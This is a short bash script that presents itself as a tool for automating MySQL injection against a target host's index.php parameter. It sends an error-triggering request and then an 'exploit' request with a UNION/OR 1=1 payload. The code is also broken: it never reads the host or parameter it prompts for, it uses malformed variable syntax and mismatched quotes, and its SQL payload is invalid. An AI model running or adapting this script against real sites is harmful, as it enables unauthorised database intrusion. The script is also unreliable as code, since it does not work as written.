#!/bin/bash
# This is a script that is made to automate mysql injections

echo "Enter the host info (ip/domain)" 
echo "Submit the the vulnerable/suspected parameter"

# Triggering an error
curl "$host/index.php?{$p}=' "' %'-- -"" | grep error

# The Exploit
curl "{$host}/index.php?{$p}=' UNION OR 1=1;-- -"
